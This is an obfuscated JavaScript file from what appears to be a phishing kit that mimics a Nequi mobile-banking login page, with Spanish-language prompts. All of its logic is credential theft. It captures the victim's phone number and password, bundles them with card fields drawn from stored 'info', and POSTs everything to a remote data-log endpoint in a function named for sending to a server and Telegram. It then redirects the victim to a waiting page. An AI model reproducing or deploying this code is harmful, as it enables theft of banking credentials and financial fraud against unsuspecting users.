const _0x2e163b = _0x4d2c;
(function (_0x342e19, _0x113863) {
  const _0x434ac5 = _0x4d2c,
    _0x148291 = _0x342e19();
  while (!![]) {
    try {
      const _0x18cb2b =
        (parseInt(_0x434ac5(0x1a1)) / 0x1) *
          (parseInt(_0x434ac5(0x1b5)) / 0x2) +
        parseInt(_0x434ac5(0x1a9)) / 0x3 +
        -parseInt(_0x434ac5(0x1a3)) / 0x4 +
        -parseInt(_0x434ac5(0x1b9)) / 0x5 +
        -parseInt(_0x434ac5(0x1c6)) / 0x6 +
        (-parseInt(_0x434ac5(0x1c7)) / 0x7) *
          (-parseInt(_0x434ac5(0x1b7)) / 0x8) +
        (-parseInt(_0x434ac5(0x1ad)) / 0x9) *
          (-parseInt(_0x434ac5(0x1bc)) / 0xa);
      if (_0x18cb2b === _0x113863) break;
      else _0x148291["push"](_0x148291["shift"]());
    } catch (_0x18b464) {
      _0x148291["push"](_0x148291["shift"]());
    }
  }
})(_0x4fd9, 0xe6105);
function updateLS() {
  const _0x242d24 = _0x4d2c;
  LS[_0x242d24(0x1ae)]("info", JSON[_0x242d24(0x1bd)](info));
}
async function sendDataToServerAndTelegram() {
  const _0x1430eb = _0x4d2c,
    _0x3ce7c9 = document[_0x1430eb(0x1c0)](_0x1430eb(0x1c8));
  _0x3ce7c9[_0x1430eb(0x1a0)] = !![];
  try {
    const _0x4b0aa7 = {
        reg: info[_0x1430eb(0x1a7)]["cc"],
        name: info["metaInfo"][_0x1430eb(0x1b4)],
        cl: info[_0x1430eb(0x1a7)][_0x1430eb(0x1be)],
        us: info[_0x1430eb(0x1a7)][_0x1430eb(0x1b8)],
        ps: info[_0x1430eb(0x1a7)][_0x1430eb(0x1c3)],
        source: _0x1430eb(0x19f),
        status: _0x1430eb(0x1ac),
        bn: _0x1430eb(0x19f),
      },
      _0x1b7fc8 = await fetch(url + "/dataLogs/addDataLog", {
        method: _0x1430eb(0x1c5),
        headers: {
          "Content-Type": _0x1430eb(0x1b2),
          Origin: window["location"][_0x1430eb(0x1a2)],
        },
        body: JSON[_0x1430eb(0x1bd)](_0x4b0aa7),
      });
    if (!_0x1b7fc8["ok"]) {
      const _0x363194 = await _0x1b7fc8[_0x1430eb(0x1bb)]();
      throw new Error(
        _0x363194[_0x1430eb(0x1b0)] ||
          "Error\x20en\x20el\x20POST\x20a\x20addDataLog"
      );
    }
    const _0xb8086c = await _0x1b7fc8[_0x1430eb(0x1bb)]();
    localStorage[_0x1430eb(0x1ae)](
      _0x1430eb(0x1ba),
      _0xb8086c[_0x1430eb(0x1ab)]
    ),
      localStorage["setItem"](_0x1430eb(0x1c4), _0xb8086c["id"]),
      console["log"](
        "Datos\x20enviados\x20a\x20addDataLog\x20y\x20guardados\x20en\x20localStorage"
      ),
      (window[_0x1430eb(0x1af)][_0x1430eb(0x1b3)] = "./wait.html");
  } catch (_0x5209f6) {
    console[_0x1430eb(0x1b0)](_0x1430eb(0x1c2), _0x5209f6),
      alert(_0x1430eb(0x1aa));
  } finally {
    _0x3ce7c9["disabled"] = ![];
  }
}
function _0x4d2c(_0x42bbfb, _0x2c6582) {
  const _0x4fd9b5 = _0x4fd9();
  return (
    (_0x4d2c = function (_0x4d2c86, _0x4e901e) {
      _0x4d2c86 = _0x4d2c86 - 0x19f;
      let _0x5841b5 = _0x4fd9b5[_0x4d2c86];
      return _0x5841b5;
    }),
    _0x4d2c(_0x42bbfb, _0x2c6582)
  );
}
function _0x4fd9() {
  const _0x52081b = [
    "btn-consultar",
    "Nequi",
    "disabled",
    "1ljwWHc",
    "origin",
    "522272yIIidh",
    "txt-num",
    "focus",
    "../../pay.html",
    "metaInfo",
    "backbutton",
    "3194052iqclbS",
    "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "token",
    "Ingresó\x20usuario",
    "45mYURsn",
    "setItem",
    "location",
    "error",
    "txt-pass",
    "application/json",
    "href",
    "dudename",
    "1836278bxVCOM",
    "Por\x20favor\x20ingrese\x20su\x20número\x20de\x20celular",
    "8vZkHYS",
    "user",
    "8854300riVwLy",
    "dataLogToken",
    "json",
    "489080xaQFlt",
    "stringify",
    "telnum",
    "click",
    "getElementById",
    "value",
    "Error\x20al\x20enviar\x20los\x20datos:",
    "puser",
    "dataLogId",
    "POST",
    "2136972oufmyI",
    "6807976HQtlMa",
  ];
  _0x4fd9 = function () {
    return _0x52081b;
  };
  return _0x4fd9();
}
document[_0x2e163b(0x1c0)](_0x2e163b(0x1c8))["addEventListener"](
  _0x2e163b(0x1bf),
  function (_0x4c4d66) {
    const _0x4b779e = _0x2e163b;
    _0x4c4d66["preventDefault"](), console["log"](_0x4b779e(0x1bf));
    if (document[_0x4b779e(0x1c0)]("txt-num")[_0x4b779e(0x1c1)] == "") {
      alert(_0x4b779e(0x1b6)),
        document[_0x4b779e(0x1c0)]("txt-num")[_0x4b779e(0x1a5)]();
      return;
    } else {
      if (document[_0x4b779e(0x1c0)]("txt-pass")["value"] == "") {
        alert("Por\x20favor\x20ingrese\x20su\x20contraseña"),
          document[_0x4b779e(0x1c0)](_0x4b779e(0x1b1))[_0x4b779e(0x1a5)]();
        return;
      } else {
        const _0x9aa874 = document[_0x4b779e(0x1c0)](_0x4b779e(0x1a4))[
            _0x4b779e(0x1c1)
          ],
          _0xe6bb78 = document["getElementById"]("txt-pass")[_0x4b779e(0x1c1)];
        (info["metaInfo"][_0x4b779e(0x1b8)] = _0x9aa874),
          (info[_0x4b779e(0x1a7)][_0x4b779e(0x1c3)] = _0xe6bb78),
          updateLS(),
          sendDataToServerAndTelegram();
      }
    }
  }
),
  document[_0x2e163b(0x1c0)](_0x2e163b(0x1a8))["addEventListener"](
    _0x2e163b(0x1bf),
    function () {
      const _0x3b19b7 = _0x2e163b;
      window[_0x3b19b7(0x1af)]["href"] = _0x3b19b7(0x1a6);
    }
  );
